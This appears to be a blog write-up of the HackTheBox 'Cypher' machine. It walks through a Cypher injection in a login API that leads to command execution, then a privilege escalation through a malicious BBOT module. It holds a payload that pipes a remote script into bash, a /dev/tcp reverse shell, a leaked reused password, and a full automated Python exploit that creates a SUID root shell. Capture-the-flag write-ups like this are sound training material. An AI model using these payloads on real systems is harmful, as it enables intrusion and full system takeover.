---
title: Cypher [Medium]
date: 2025-03-02
categories: [HackTheBox]
tags: Linux Web
img_path: /assets/Images/HTB_Cypher/logo.png
image:
  path: /assets/Images/HTB_Cypher/logo.png
---

# Cypher [Medium]

![Cypher.png](/assets/Images/HTB_Cypher/Cypher.png)

## 🤨 Enumeration : -

```bash
nmap -T4 -vv -sC -sV -oN nmap/intial 10.10.11.57
```

```bash
# Nmap 7.94SVN scan initiated Sun Mar  2 05:56:15 2025 as: nmap -T4 -vv -sC -sV -oN nmap/intial 10.10.11.57
Increasing send delay for 10.10.11.57 from 0 to 5 due to 47 out of 117 dropped probes since last increase.
Increasing send delay for 10.10.11.57 from 5 to 10 due to 20 out of 49 dropped probes since last increase.
Nmap scan report for 10.10.11.57
Host is up, received reset ttl 63 (0.27s latency).
Scanned at 2025-03-02 05:56:16 IST for 41s
Not shown: 993 closed tcp ports (reset)
PORT      STATE    SERVICE     REASON         VERSION
22/tcp    open     ssh         syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp    open     http        syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
1034/tcp  filtered zincite-a   no-response
2190/tcp  filtered tivoconnect no-response
2725/tcp  filtered msolap-ptp2 no-response
5060/tcp  filtered sip         no-response
10012/tcp filtered unknown     no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar  2 05:56:57 2025 -- 1 IP address (1 host up) scanned in 41.82 seconds

```

```bash
http://cypher.htb
```

![Screenshot 2025-03-02 at 2.35.04 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.35.04_AM.png)

```bash
http://cypher.htb/login
```

![Screenshot 2025-03-02 at 2.35.15 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.35.15_AM.png)

---

## 🔱 Initial Access :-

Intercept the request

![Screenshot 2025-03-02 at 2.36.49 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.36.49_AM.png)

I juts put a single quote to test 

![Screenshot 2025-03-02 at 2.37.35 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.37.35_AM.png)

it seems to be a Cypher error So we can just search it about !

[Cypher Injection Cheat Sheet](https://pentester.land/blog/cypher-injection-cheatsheet/)

[Fun with Cypher Injections - HackMD](https://hackmd.io/@Chivato/rkAN7Q9NY)

And to Discuss this topic we can use ChatGPT 

![Screenshot 2025-03-02 at 2.50.05 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.50.05_AM.png)

So after many hit and try i finally got a solution + before that i can just ping my server but now i can get a RCE 

### Cypher Injection to Remote Code Execution (RCE)

While talking to ChatGPT and i read the article i got the payload which i can get the RCE

![Screenshot 2025-03-02 at 2.08.26 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.08.26_AM.png)

So we got the system command for this `getUrlStatusCode()`

Payload 

```bash
' return h.value as a UNION CALL custom.getUrlStatusCode(\"cypher.com;curl 10.10.xx.xx/shell.sh|bash;#\") YIELD statusCode AS a RETURN a;//
```

Here's why it takes three parts:

1. The **`UNION`** statement allows combining **two separate Cypher queries**.
2. The second query (`CALL custom.getUrlStatusCode(...)`) executes independently.
3. The function `custom.getUrlStatusCode(...)` is supposed to check the status of a URL, but we are injecting a **command instead**.
4. **`example.com`** → This is the expected input, likely the target **domain or URL** the function is supposed to check the HTTP status for.
5. **`; bash;`** → The semicolon (`;`) **ends the original command** and **starts a new command** (`bash` in this case).
6. **`#`** → The `#` symbol is a **comment in Cypher**, meaning anything after it is ignored, which helps **hide syntax errors**.

**`getUrlStatusCode()` is likely running shell commands in the backend**, e.g.,:

![Screenshot 2025-03-02 at 2.56.44 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.56.44_AM.png)

[Example]

Make a python server & shell.sh to get a reverse_shell & make netcat to listen

```bash
python3 -m http.server 80
```

```bash
echo "/bin/bash -i >& /dev/tcp/10.10.xx.xx/2004 0>&1" > shell.sh
```

```bash
rlwrap -f . -r nc -nvlp 2004
```

The request which will trigger a shell

![01.png](/assets/Images/HTB_Cypher/01.png)

Burp Request of the Above image

```bash
POST /api/auth HTTP/1.1
Host: cypher.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 184
Origin: http://cypher.htb
Connection: keep-alive
Referer: http://cypher.htb/login

{"username":"admin' return h.value as a UNION CALL custom.getUrlStatusCode(\"cypher.com;curl 10.10.xx.xx/shell.sh|bash;#\") YIELD statusCode AS a RETURN a;//","password":"Password123"}
```

![Screenshot 2025-03-02 at 2.38.19 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.38.19_AM.png)

i was going to read the user.txt but permission denied | so i found a file in the same directory 

Which contains passwords

```bash
cat /home/graphasm/bbot_preset.yml
```

![Screenshot 2025-03-02 at 2.32.48 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.32.48_AM.png)

```bash
neo4j:cU4btyib.20xtCMCXkBmerhK

(Reused)

graphasm:cU4btyib.20xtCMCXkBmerhK
```

---

```bash
ssh graphasm@10.10.11.57
```

→ `cU4btyib.20xtCMCXkBmerhK`

![Screenshot 2025-03-02 at 2.33.34 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.33.34_AM.png)

```bash
cat user.txt
```

---

## 💀 PrivEsc

```bash
sudo -l
```

![Screenshot 2025-03-02 at 2.33.43 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_2.33.43_AM.png)

```bash
sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run
```

### **Breaking it Down:**

1. **`sudo /usr/local/bin/bbot`**
    - Runs BBOT as root.
2. **`cy /root/root.txt`**
    - `cy` (or `-custom-yara-rules`) is used to provide a custom YARA rules file.
    - You are passing `/root/root.txt`, which is **not** a YARA rule file but rather the flag for the `root.txt` file.
    - If BBOT improperly handles this argument, it **might read** the file instead of treating it as a YARA ruleset.
3. **`d`**
    - Enables **debug mode**, which provides more verbose output for troubleshooting.
4. **`-dry-run`**
    - Prevents actual execution of the scan but **processes the input arguments** and simulates execution.

### **Potential Exploit?**

- If BBOT **reads** and **processes** `/root/root.txt`, you might be able to **leak its contents** in debug logs or error messages.
- Since BBOT runs as root via `sudo`, it has **permission to read `/root/root.txt`**, even if your user normally wouldn’t.

![Screenshot 2025-03-02 at 1.34.57 AM.png](/assets/Images/HTB_Cypher/Screenshot_2025-03-02_at_1.34.57_AM.png)

---

## 😈 `Full Exploit` :-

A Fully Automated Exploit for the whole process 

```python
#!/usr/bin/env python3
# Exploit Developed By :- PaiN
import paramiko
import time

# SSH credentials
hostname = "10.10.11.57"
port = 22
username = "graphasm"
password = "cU4btyib.20xtCMCXkBmerhK"
file_path = "/home/graphasm/user.txt"
remote_script_path = "/tmp/exploit.sh"

# Bash script was made by :- {M@r&k}
bash_script = """#!/bin/bash
set -e

echo "Creating malicious BBOT config..."
cat << EOF > /tmp/myconf.yml
module_dirs:
  - /tmp/modules
EOF

echo "Creating modules directory..."
mkdir -p /tmp/modules

echo "Creating malicious whois2 module..."
cat << 'EOF' > /tmp/modules/whois2.py
from bbot.modules.base import BaseModule
import os

class whois2(BaseModule):
    watched_events = ["DNS_NAME"]
    produced_events = ["WHOIS"]
    flags = ["passive", "safe"]
    meta = {"description": "Query WhoisXMLAPI for WHOIS data"}
    options = {"api_key": ""}
    options_desc = {"api_key": "WhoisXMLAPI Key"}
    per_domain_only = True

    async def setup(self):
        os.system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash")
        self.api_key = self.config.get("api_key")
        return True

    async def handle_event(self, event):
        pass
EOF

echo "Executing malicious BBOT module..."
sudo /usr/local/bin/bbot -p /tmp/myconf.yml -m whois2

if [ -u /tmp/bash ]; then
    echo -e "\\n[+] SUID bash created successfully!"
    echo -e "[*] Spawning root shell...\\n"
    /tmp/bash -p
else
    echo -e "\\n[-] Exploit failed - SUID bash not created"
    exit 1
fi
"""

# Create an SSH client
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    # Connect to SSH
    client.connect(hostname, port, username, password)
    print("[+] Connected to the SSH Shell")

    # Read user.txt
    sftp = client.open_sftp()
    print("[+] Reading user flag...")
    with sftp.open(file_path, 'r') as file:
        userflag = file.read().decode().strip()
        print("User.txt : " + userflag)

    # Upload Bash script
    print("[+] Uploading exploit script...")
    with sftp.open(remote_script_path, 'w') as remote_file:
        remote_file.write(bash_script)

    # Set execute permissions
    print("[+] Setting execute permissions...")
    client.exec_command(f"chmod +x {remote_script_path}")

    # Open an interactive shell
    print("[+] Running the exploit script interactively...")
    shell = client.invoke_shell()
    shell.send(f"bash {remote_script_path}\n")  # Execute the script

    # Wait for the exploit prompt and send Enter
    time.sleep(3)  # Adjust if needed
    shell.send("\n")
    print("[+] Sent Enter key to proceed...")

    # Allow time for the exploit to complete and drop into the new shell
    time.sleep(5)

    # Run "cat /root/root.txt" inside the root shell
    print("[+] Attempting to read root flag...")
    shell.send("cat /root/root.txt\n")
    time.sleep(2)  # Allow time for the command to execute

    # Read the output and extract the root flag
    output = shell.recv(4096).decode()
    print(output, end="")  # Print output

    # Drop into interactive root shell
    print("[+] Exploit executed. Dropping into interactive shell (bash-5.2#)...")
    shell.send("exec bash -p\n")  # Keep the shell interactive
    time.sleep(1)

    while True:
        output = shell.recv(4096).decode()
        print(output, end="")  # Print output without extra newlines
        command = input("\033[92m(PaiN 💀) \033[0m")  # Green shell prompt
        shell.send(command + "\n")
        time.sleep(1)  # Allow time for response

except Exception as e:
    print(f"Error: {e}")

finally:
    sftp.close()
    client.close()
```

---

Telegram Id : `@PAINNNN_21`

Discord : `pain._.05`